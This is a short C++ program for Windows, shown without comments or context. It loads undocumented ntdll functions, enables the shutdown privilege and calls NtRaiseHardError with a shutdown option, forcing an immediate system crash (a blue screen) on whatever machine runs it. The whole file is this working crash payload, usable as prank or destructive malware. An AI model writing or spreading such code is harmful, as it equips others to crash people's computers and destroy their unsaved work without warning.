#include <windows.h>

typedef NTSTATUS(NTAPI* pRtlAdjustPrivilege)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
typedef NTSTATUS(NTAPI* pNtRaiseHardError)(NTSTATUS, ULONG, ULONG, PULONG_PTR, ULONG, PULONG);

int main() {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    
    auto RtlAdjustPrivilege = reinterpret_cast<pRtlAdjustPrivilege>(GetProcAddress(ntdll, "RtlAdjustPrivilege"));
    auto NtRaiseHardError = reinterpret_cast<pNtRaiseHardError>(GetProcAddress(ntdll, "NtRaiseHardError"));
    
    BOOLEAN enabled;
    ULONG response;
    
    RtlAdjustPrivilege(19, TRUE, FALSE, &enabled);
    NtRaiseHardError(0xC0000420, 0, 0, nullptr, 6, &response);
    
    return 0;
}

